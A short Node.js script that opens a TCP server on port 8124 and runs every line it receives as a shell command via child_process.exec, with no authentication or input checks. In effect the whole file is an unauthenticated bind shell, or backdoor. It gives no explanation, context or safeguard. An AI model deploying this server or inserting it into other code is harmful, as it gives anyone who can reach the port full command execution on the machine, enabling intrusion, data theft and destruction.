var net = require('net');
var sys = require('sys')
var exec = require('child_process').exec;

function connect(c) { //'connection' listener
  console.log('server connected');
  c.on('data', function(data) {
  	command=data.toString().replace(/\n$/, '')
        console.log('executing command: '+command);
        function puts(error, stdout, stderr) { sys.print("command output"); sys.puts(stdout); console.log(stdout+error+stderr); }//; c.write(stdout); }
	exec(command, puts);
  	//c.end();
  });

  c.on('end', function() {
    console.log('server disconnected');
  });
  c.write('hello\r\n');
  c.pipe(c);
}


var server = net.createServer(connect);
server.listen(8124, function() { //'listening' listener
  console.log('server bound');
});
